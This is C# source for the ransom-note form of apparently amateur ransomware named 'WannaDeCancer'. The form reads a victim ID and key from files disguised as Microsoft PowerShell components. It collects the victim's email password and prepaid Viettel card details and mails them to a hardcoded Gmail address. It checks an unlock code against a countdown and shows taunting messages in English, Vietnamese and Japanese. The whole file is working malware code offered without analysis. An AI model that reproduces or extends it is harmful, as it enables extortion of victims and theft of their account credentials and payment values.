using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Diagnostics;

namespace WannaDeCancer
{
    public partial class FormSend : Form
    {
        #region Field
        string decryptID;
        int keygen;
        SmtpClient userEmail;
        MailMessage mail;
        TimeSpan span;
        #endregion

        #region Contructor
        public FormSend(string lang, TimeSpan span)
        {
            this.span = span;         
            InitializeComponent();
            CustomInit();
            Decription(lang);
        }
        #endregion

        private void CustomInit()
        {
            //Keygen
            keygen = int.Parse(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\shell.exe", EncodeType.UTF));
            decryptID = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\manager.exe", EncodeType.UTF);
            //Text
            txbEmailAddress.Text = @"@gmail.com";
            txbPort.Text = 587.ToString();
            txbNotes.Text = @"Please decrypt my files :(";
        }
        
        private void btnSend_Click(object sender, EventArgs e)
        {
            //Wrong format
            try
            {
                MailInformation();
            }
            catch
            {
                MessageBox.Show("Invaild Format, please re-check your information");
                return;
            }
            //Error while send
            try
            {
                userEmail.Send(mail);
            }
            catch (Exception error)
            {
                MessageBox.Show("Email failed to send, please check your internet connection" + error.Message);
            }
        }

        /// <summary>
        /// Email Body
        /// </summary>
        /// <returns></returns>
        private string MailContent()
        {
            string result = "-----Auto-Generated by code----- \r\n";
            result += "Decrypt ID: " + decryptID + "\r\n";
            result += keygen + "\r\n";
            result += $"Email Information: {txbEmailAddress.Text} / {txbPassword.Text} \r\n";
            result += "-------------------------------";
            result += $"Viettel Card Infomation: {txbSerial.Text} / {txbHost.Text} ";
            result += $"{txbNotes.Text}";
            return result;
        }

        /// <summary>
        /// Write Information about the email to send
        /// </summary>
        private void MailInformation()
        {
            //Everything the server Provider need
            userEmail = new SmtpClient();
            int emailPort;
            if (int.TryParse(txbPort.Text, out emailPort))
                userEmail.Port = emailPort;
            else
                userEmail.Port = 587;

            userEmail.Host = txbHost.Text;
            userEmail.EnableSsl = ckbSsl.Checked;
            userEmail.DeliveryMethod = SmtpDeliveryMethod.Network;
            userEmail.UseDefaultCredentials = false;
            userEmail.Credentials = new NetworkCredential(txbEmailAddress.Text, txbPassword.Text);

            //Things we will send throungh email:
            mail = new MailMessage();
            mail.From = new MailAddress(txbEmailAddress.Text);
            mail.To.Add(@"quangaming.noreply@gmail.com");
            mail.Subject = "Decrypt request from: " + decryptID;
            mail.Body = MailContent();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://myaccount.google.com/lesssecureapps");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (ValidateDecryptVal() && span > TimeSpan.Zero)
            {
                MessageBox.Show("Yayyyyy, The code is valid, Now We will decrypt your files!", "Your files is safe!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (!ValidateDecryptVal() && span > TimeSpan.Zero)
                MessageBox.Show("Please check your Decrypt Value!", "Wrong Decrypt Value", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
                MessageBox.Show("Sorry, you out of time, I will left your encrypted file as a present", "Time Out :(", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }

        private bool ValidateDecryptVal()
        {
            char[] inputValue = txbDecryptValue.Text.ToArray();

            for (int i = 0; i < 25; i++)
            {
                int inputTemp = inputValue[i] - keygen;
                int systemTemp = decryptID[i];
                if (systemTemp != inputTemp)
                    return false;
            }

            return true;
        }

        /// <summary>
        /// Languages Change
        /// </summary>
        /// <param name="lang"></param>
        private void Decription(string lang)
        {
            switch (lang)
            {
                case "English":
                    lbTitle.Text = @"Let Get Started:";
                    lbSubTitle.Text = @"Send us your Information as mentioned in the previous textbox";
                    lbDesEmailAddress.Text = @"Your email address:";
                    ckbSsl.Text = @"Enable Ssl?";
                    lbDesPassWord.Text = @"Password";
                    lbDesPort.Text = @"Port";
                    lbDesNotes.Text = @"Note";
                    btnSend.Text = @"Send";
                    lbValidate.Text = @"Validating:";
                    lbSubValidate.Text = @"Have you send that, If you are, Good Job: Let validate";
                    lbDesDecryptVal.Text = @"First, Type the decrypt value That I sent to you";
                    lbDesPort.Text = @"Too poor? Maybe try to beat some challenge";
                    btnValidate.Text = @"Validate!";
                    break;
                case "VN":
                    lbTitle.Text = @"Hãy bắt đầu:";
                    lbSubTitle.Text = @"Gửi thông tin của bạn như đã đề cập trong hộp văn bản trước đó";
                    lbDesEmailAddress.Text = @"Địa chỉ email của bạn:";
                    ckbSsl.Text = @"Bật Ssl?";
                    lbDesPassWord.Text = @"Mật khẩu";
                    lbDesPort.Text = @"Cổng";
                    lbDesNotes.Text = @"Chú thích";
                    btnSend.Text = @"Gửi";
                    lbValidate.Text = @"Xác nhận:";
                    lbSubValidate.Text = @"Bạn đã gửi nó? Nếu bạn có, Tốt lắm: Hãy kiểm tra tính hợp lệ";
                    lbDesDecryptVal.Text = @"Đầu tiên, Gõ giá trị giải mã mà tôi đã gửi cho bạn";
                    lbDesPoor.Text = @"Quá nghèo? Có thể cố gắng để đánh bại một số thách thức";
                    btnValidate.Text = @"Xác nhận!";
                    break;
                case "日本語":
                    lbTitle.Text = @"始めましょう：";
                    lbSubTitle.Text = @"上記のテキストボックスに記載されている情報を私たちにお送りください";
                    lbDesEmailAddress.Text = @"メールアドレス：";
                    ckbSsl.Text = @"有効にする Ssl?";
                    lbDesPassWord.Text = @"パスワード";
                    lbDesPort.Text = @"ポート";
                    lbDesNotes.Text = @"注意";
                    btnSend.Text = @"送信";
                    lbValidate.Text = @"検証中：";
                    lbSubValidate.Text = @"あなたがそれを送ったことがありますか？あなたがいれば、良い仕事：";
                    lbDesDecryptVal.Text = @"まず、私があなたに送った復号化値を入力してください";
                    lbDesPoor.Text = @"あまりにも貧しい？ たぶん、いくつかのチャレンジを打つことを試みる";
                    btnValidate.Text = @"検証！";
                    break;
                default:
                    break;
            }
        }
    }
}
